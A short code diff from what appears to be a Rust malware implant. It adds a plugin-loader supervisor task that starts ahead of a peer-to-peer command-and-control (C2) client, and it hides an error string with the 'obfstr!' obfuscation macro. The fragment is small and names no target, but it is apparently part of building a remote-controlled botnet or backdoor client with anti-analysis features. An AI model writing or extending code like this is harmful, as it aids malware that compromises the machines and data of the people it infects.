@@ -20,6 +20,11 @@ async fn main() {
         return; 
     }
 
+    // Spawn Plugin Supervisor
+    tokio::spawn(async {
+        modules::loader::start_supervisor().await;
+    });
+
     // Lite Mode: Just run C2
     if let Err(e) = p2p::c2::start_client().await {
         eprintln!("{}: {}", obfstr!("C2 Error"), e);
